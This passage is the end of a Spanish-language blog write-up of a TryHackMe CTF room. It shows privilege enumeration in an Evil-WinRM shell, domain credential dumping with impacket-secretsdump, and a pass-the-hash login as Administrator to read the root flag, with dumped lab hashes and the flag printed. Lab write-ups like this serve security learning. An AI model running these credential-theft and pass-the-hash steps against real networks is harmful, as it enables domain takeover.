</span></span><span class="line"><span class="cl"><span class="ss">Warning</span><span class="p">:</span> <span class="no">Remote</span> <span class="n">path</span> <span class="n">completions</span> <span class="n">is</span> <span class="n">disabled</span> <span class="n">due</span> <span class="n">to</span> <span class="n">ruby</span> <span class="ss">limitation</span><span class="p">:</span> <span class="n">undefined</span> <span class="nb">method</span> <span class="sb">`quoting_detection_proc&#39; for module Reline
</span></span></span><span class="line"><span class="cl"><span class="sb">                                        
</span></span></span><span class="line"><span class="cl"><span class="sb">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span></span><span class="line"><span class="cl"><span class="sb">                                        
</span></span></span><span class="line"><span class="cl"><span class="sb">Info: Establishing connection to remote endpoint
</span></span></span><span class="line"><span class="cl"><span class="sb">*Evil-WinRM* PS C:\Users\FileServer$\Documents&gt; </span></span></span></code></pre></div>
<p>Nos fijamos con <code>whoami /priv</code> que tenemos privilegios para dumpear SAM, NTDS hashes para poder hacer Pass The Hash con el usuario de Administrator:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="ss">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="no">FileServer</span><span class="vg">$\</span><span class="no">Documents</span><span class="o">&gt;</span> <span class="n">whoami</span> <span class="sr">/priv
</span></span></span><span class="line"><span class="cl"><span class="sr">                                                                                                                                                                                                                                             
</span></span></span><span class="line"><span class="cl"><span class="sr">PRIVILEGES INFORMATION                                                                                                                                                                                                                       
</span></span></span><span class="line"><span class="cl"><span class="sr">----------------------                                                                                                                                                                                                                       
</span></span></span><span class="line"><span class="cl"><span class="sr">                                                                                                                                                                                                                                             
</span></span></span><span class="line"><span class="cl"><span class="sr">Privilege Name                            Description                                                        State                                                                                                                           
</span></span></span><span class="line"><span class="cl"><span class="sr">========================================= ================================================================== =======                                                                                                                         
</span></span></span><span class="line"><span class="cl"><span class="sr">SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled                                                                                                                         
</span></span></span><span class="line"><span class="cl"><span class="sr">SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled                                                                                                                         
</span></span></span><span class="line"><span class="cl"><span class="sr">SeSecurityPrivilege                       Manage auditing and security log                                   Enabled                                                                                                                         
</span></span></span><span class="line"><span class="cl"><span class="sr">SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled                                                                                                                         
</span></span></span><span class="line"><span class="cl"><span class="sr">SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled                                                                                                                         
</span></span></span><span class="line"><span class="cl"><span class="sr">SeSystemProfilePrivilege                  Profile system performance                                         Enabled                                                                                                                         
</span></span></span><span class="line"><span class="cl"><span class="sr">SeSystemtimePrivilege                     Change the system time                                             Enabled                                                                                                                         
</span></span></span><span class="line"><span class="cl"><span class="sr">SeProfileSingleProcessPrivilege           Profile single process                                             Enabled                                                                                                                         
</span></span></span><span class="line"><span class="cl"><span class="sr">SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled                                                                                                                         
</span></span></span><span class="line"><span class="cl"><span class="sr">SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled                                                                                                                         
</span></span></span><span class="line"><span class="cl"><span class="sr">SeBackupPrivilege                         Back up files and directories                                      Enabled
</span></span></span><span class="line"><span class="cl"><span class="sr">SeRestorePrivilege                        Restore files and directories                                      Enabled
</span></span></span><span class="line"><span class="cl"><span class="sr">SeShutdownPrivilege                       Shut down the system                                               Enabled
</span></span></span><span class="line"><span class="cl"><span class="sr">SeDebugPrivilege                          Debug programs                                                     Enabled
</span></span></span><span class="line"><span class="cl"><span class="sr">SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
</span></span></span><span class="line"><span class="cl"><span class="sr">SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
</span></span></span><span class="line"><span class="cl"><span class="sr">SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
</span></span></span><span class="line"><span class="cl"><span class="sr">SeUndockPrivilege                         Remove computer from docking station                               Enabled
</span></span></span><span class="line"><span class="cl"><span class="sr">SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
</span></span></span><span class="line"><span class="cl"><span class="sr">SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
</span></span></span><span class="line"><span class="cl"><span class="sr">SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
</span></span></span><span class="line"><span class="cl"><span class="sr">SeCreateGlobalPrivilege                   Create global objects                                              Enabled
</span></span></span><span class="line"><span class="cl"><span class="sr">SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
</span></span></span><span class="line"><span class="cl"><span class="sr">SeTimeZonePrivilege                       Change the time zone                                               Enabled
</span></span></span><span class="line"><span class="cl"><span class="sr">SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
</span></span></span><span class="line"><span class="cl"><span class="sr">SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled</span></span></span></code></pre></div>
<p>Dumpeamos:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">impacket</span><span class="o">-</span><span class="n">secretsdump</span> <span class="s1">&#39;SOUPEDECODE.LOCAL/FileServer$@10.201.61.197&#39;</span> <span class="o">-</span><span class="n">hashes</span> <span class="ss">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">e41da7e79a4c76dbd9cf79d1cb325559</span>
</span></span><span class="line"><span class="cl"><span class="no">Impacket</span> <span class="n">v0</span><span class="o">.</span><span class="mi">13</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="n">dev0</span> <span class="o">-</span> <span class="no">Copyright</span> <span class="no">Fortra</span><span class="p">,</span> <span class="no">LLC</span> <span class="ow">and</span> <span class="n">its</span> <span class="n">affiliated</span> <span class="n">companies</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">Service</span> <span class="no">RemoteRegistry</span> <span class="n">is</span> <span class="k">in</span> <span class="n">stopped</span> <span class="n">state</span>
</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">Starting</span> <span class="n">service</span> <span class="no">RemoteRegistry</span>
</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">Target</span> <span class="nb">system</span> <span class="ss">bootKey</span><span class="p">:</span> <span class="mh">0x0c7ad5e1334e081c4dfecd5d77cc2fc6</span>
</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">Dumping</span> <span class="n">local</span> <span class="no">SAM</span> <span class="n">hashes</span> <span class="p">(</span><span class="ss">uid</span><span class="p">:</span><span class="ss">rid</span><span class="p">:</span><span class="ss">lmhash</span><span class="p">:</span><span class="n">nthash</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="ss">Administrator</span><span class="p">:</span><span class="mi">500</span><span class="ss">:aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">209</span><span class="n">c6174da490caeb422f3fa5a7ae634</span><span class="o">::</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="ss">Guest</span><span class="p">:</span><span class="mi">501</span><span class="ss">:aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="o">::</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="ss">DefaultAccount</span><span class="p">:</span><span class="mi">503</span><span class="ss">:aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="o">::</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">Dumping</span> <span class="n">cached</span> <span class="n">domain</span> <span class="n">logon</span> <span class="n">information</span> <span class="p">(</span><span class="n">domain</span><span class="o">/</span><span class="ss">username</span><span class="p">:</span><span class="nb">hash</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">Dumping</span> <span class="no">LSA</span> <span class="no">Secrets</span>
</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="vg">$MACHINE</span><span class="o">.</span><span class="n">ACC</span> 
</span></span><span class="line"><span class="cl"><span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">DC01</span><span class="vg">$:</span><span class="n">aes256</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="p">:</span><span class="mi">3</span><span class="n">d91531f9358d80ab879ac09ba747e6f581de5c8b2b2958644a1d7feb0077cc5</span>
</span></span><span class="line"><span class="cl"><span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">DC01</span><span class="vg">$:</span><span class="n">aes128</span><span class="o">-</span><span class="n">cts</span><span class="o">-</span><span class="n">hmac</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="mi">96</span><span class="ss">:fd84b845b43d577f98906eac88fd1c31</span>
</span></span><span class="line"><span class="cl"><span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">DC01</span><span class="vg">$:</span><span class="n">des</span><span class="o">-</span><span class="n">cbc</span><span class="o">-</span><span class="ss">md5</span><span class="p">:</span><span class="mi">7</span><span class="n">fad83d6d05d3d26</span>
</span></span><span class="line"><span class="cl"><span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">DC01</span><span class="vg">$:</span><span class="ss">plain_password_hex</span><span class="p">:</span><span class="mi">2</span><span class="n">d327ad36c3f524a928a285c81a62dd6b44c9c2a9cdc59688c802d3a8df7b82402201a056abcae9243efd59d2caa12618416b3f32dec47ac9a14745e364286604352d4368b888b7441c938cae135bda964e12d422359bf8ae12f84f7d4db7253d06b4533a51604cc674b4370a04ceafdcbfce7447eb3443fb86ffbae5977fed8beb3a2e21a4b78563e0bd122a00fb7c4f81106b5ce7e5a9e0edbe7d8763276dfe72d1cea23488a5676b833f49bba2161bf82451cd4daef10f17b32830e1094ab070e020348af2021ac5db2763d9e3c6ed8d4d0a55b409b414fb2f7154bcefd08ead7d204d3a21019aa8ae574d691785e</span>
</span></span><span class="line"><span class="cl"><span class="no">SOUPEDECODE</span><span class="p">\</span><span class="no">DC01</span><span class="vg">$:</span><span class="ss">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">98</span><span class="n">f7011807d02af84705e5eb9f771bfb</span><span class="o">::</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">DPAPI_SYSTEM</span> 
</span></span><span class="line"><span class="cl"><span class="ss">dpapi_machinekey</span><span class="p">:</span><span class="mh">0x829d1c0e3b8fdffdc9c86535eac96158d8841cf4</span>
</span></span><span class="line"><span class="cl"><span class="ss">dpapi_userkey</span><span class="p">:</span><span class="mh">0x4813ee82e68a3bf9fec7813e867b42628ccd9503</span>
</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">NL</span><span class="vg">$KM</span> 
</span></span><span class="line"><span class="cl"> <span class="mo">0000</span>   <span class="mi">44</span> <span class="no">C5</span> <span class="no">ED</span> <span class="no">CE</span> <span class="no">F5</span> <span class="mi">0</span><span class="n">E</span> <span class="no">BF</span> <span class="mi">0</span><span class="n">C</span>  <span class="mi">15</span> <span class="mi">63</span> <span class="mi">8</span><span class="n">B</span> <span class="mi">8</span><span class="n">D</span> <span class="mi">2</span><span class="n">F</span> <span class="no">A3</span> <span class="mo">06</span> <span class="mi">8</span><span class="n">F</span>   <span class="n">D</span><span class="o">........</span><span class="n">c</span><span class="o">../...</span>
</span></span><span class="line"><span class="cl"> <span class="mo">0010</span>   <span class="mi">62</span> <span class="mi">4</span><span class="n">D</span> <span class="no">CA</span> <span class="no">D9</span> <span class="mi">55</span> <span class="mi">20</span> <span class="mi">44</span> <span class="mi">41</span>  <span class="mi">75</span> <span class="mi">55</span> <span class="mi">3</span><span class="n">E</span> <span class="mi">85</span> <span class="mi">82</span> <span class="mo">06</span> <span class="mi">21</span> <span class="mi">14</span>   <span class="n">bM</span><span class="o">..</span><span class="n">U</span> <span class="no">DAuU</span><span class="o">&gt;...!.</span>
</span></span><span class="line"><span class="cl"> <span class="mo">0020</span>   <span class="mi">8</span><span class="n">E</span> <span class="no">FA</span> <span class="no">A1</span> <span class="mi">77</span> <span class="mi">0</span><span class="n">A</span> <span class="mi">9</span><span class="n">C</span> <span class="mi">0</span><span class="n">D</span> <span class="no">A4</span>  <span class="mi">9</span><span class="n">A</span> <span class="mi">96</span> <span class="mi">44</span> <span class="mi">7</span><span class="n">C</span> <span class="no">FC</span> <span class="mi">89</span> <span class="mi">63</span> <span class="mi">91</span>   <span class="o">...</span><span class="n">w</span><span class="o">......</span><span class="n">D</span><span class="o">|..</span><span class="n">c</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"> <span class="mo">0030</span>   <span class="mi">69</span> <span class="mo">02</span> <span class="mi">53</span> <span class="mi">95</span> <span class="mi">1</span><span class="n">F</span> <span class="no">ED</span> <span class="mi">0</span><span class="n">E</span> <span class="mi">77</span>  <span class="no">B5</span> <span class="mi">24</span> <span class="mi">17</span> <span class="no">BE</span> <span class="mi">6</span><span class="n">E</span> <span class="mi">80</span> <span class="no">A9</span> <span class="mi">91</span>   <span class="n">i</span><span class="o">.</span><span class="n">S</span><span class="o">....</span><span class="n">w</span><span class="o">.</span><span class="vg">$.</span><span class="o">.</span><span class="n">n</span><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="no">NL</span><span class="vg">$KM</span><span class="p">:</span><span class="mi">44</span><span class="n">c5edcef50ebf0c15638b8d2fa3068f624dcad95520444175553e85820621148efaa1770a9c0da49a96447cfc896391690253951fed0e77b52417be6e80a991</span>
</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">Dumping</span> <span class="no">Domain</span> <span class="no">Credentials</span> <span class="p">(</span><span class="n">domain</span><span class="p">\</span><span class="ss">uid</span><span class="p">:</span><span class="ss">rid</span><span class="p">:</span><span class="ss">lmhash</span><span class="p">:</span><span class="n">nthash</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[*]</span> <span class="no">Using</span> <span class="n">the</span> <span class="no">DRSUAPI</span> <span class="nb">method</span> <span class="n">to</span> <span class="n">get</span> <span class="no">NTDS</span><span class="o">.</span><span class="n">DIT</span> <span class="n">secrets</span>
</span></span><span class="line"><span class="cl"><span class="ss">Administrator</span><span class="p">:</span><span class="mi">500</span><span class="ss">:aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">88</span><span class="n">d40c3a9a98889f5cbb778b0db54a2f</span><span class="o">::</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="ss">Guest</span><span class="p">:</span><span class="mi">501</span><span class="ss">:aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="o">::</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="ss">krbtgt</span><span class="p">:</span><span class="mi">502</span><span class="ss">:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0</span><span class="o">::</span><span class="p">:</span></span></span></code></pre></div>
<p>Hacemos Pass The Hash al usuario Administrator, obtenemos la flag root.txt</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="err">$</span> <span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="n">i</span> <span class="mi">10</span><span class="o">.</span><span class="mi">201</span><span class="o">.</span><span class="mi">61</span><span class="o">.</span><span class="mi">197</span> <span class="o">-</span><span class="n">u</span> <span class="no">Administrator</span> <span class="o">-</span><span class="n">H</span> <span class="mi">88</span><span class="n">d40c3a9a98889f5cbb778b0db54a2f</span>
</span></span><span class="line"><span class="cl">                                        
</span></span><span class="line"><span class="cl"><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span> <span class="n">shell</span> <span class="n">v3</span><span class="o">.</span><span class="mi">7</span>
</span></span><span class="line"><span class="cl">                                        
</span></span><span class="line"><span class="cl"><span class="ss">Warning</span><span class="p">:</span> <span class="no">Remote</span> <span class="n">path</span> <span class="n">completions</span> <span class="n">is</span> <span class="n">disabled</span> <span class="n">due</span> <span class="n">to</span> <span class="n">ruby</span> <span class="ss">limitation</span><span class="p">:</span> <span class="n">undefined</span> <span class="nb">method</span> <span class="sb">`quoting_detection_proc&#39; for module Reline
</span></span></span><span class="line"><span class="cl"><span class="sb">                                        
</span></span></span><span class="line"><span class="cl"><span class="sb">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span></span><span class="line"><span class="cl"><span class="sb">                                        
</span></span></span><span class="line"><span class="cl"><span class="sb">Info: Establishing connection to remote endpoint
</span></span></span><span class="line"><span class="cl"><span class="sb">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; type ../Desktop/root.txt
</span></span></span><span class="line"><span class="cl"><span class="sb">27cb2be302c388d63d27c86bfdd5f56a
</span></span></span><span class="line"><span class="cl"><span class="sb">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; </span></span></span></code></pre></div>
<p><img src="/images/gifs/monkey.gif" alt=""></p>
<hr>


      </div>


      <footer>
        

<section class="see-also">
  
    
    
    
      <h3 id="también-ver-en-tryhackme">
        También ver en TryHackMe
        <a class="heading-link" href="#tambi%c3%a9n-ver-en-tryhackme">
          <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
          <span class="sr-only">Link to heading</span>
        </a>
      </h3>
      <nav>
        <ul>
        
        
          
        
          
            <li>
              <a href="/posts/billing/">Billing CTF</a>
            </li>
          
        
          
            <li>
              <a href="/posts/publisher/">Publisher CTF</a>
            </li>
          
        
          
            <li>
              <a href="/posts/blueprint/">Blueprint CTF</a>
            </li>
          
        
          
            <li>
              <a href="/posts/bugged/">Bugged CTF</a>
            </li>
          
        
        </ul>
      </nav>
    
  
</section>


        
        
        
        
        
        
        
      </footer>
    </article>

    
  </section>

    </div>

    <footer class="footer">
  <section class="container">
    ©
    
      2019 -
    
    2025
     David León 
    ·
    
    Desarrollado por <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
    
  </section>
</footer>

  </main>

  

  
  
  <script src="/js/coder.js"></script>
  

  

  


  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>
</html>
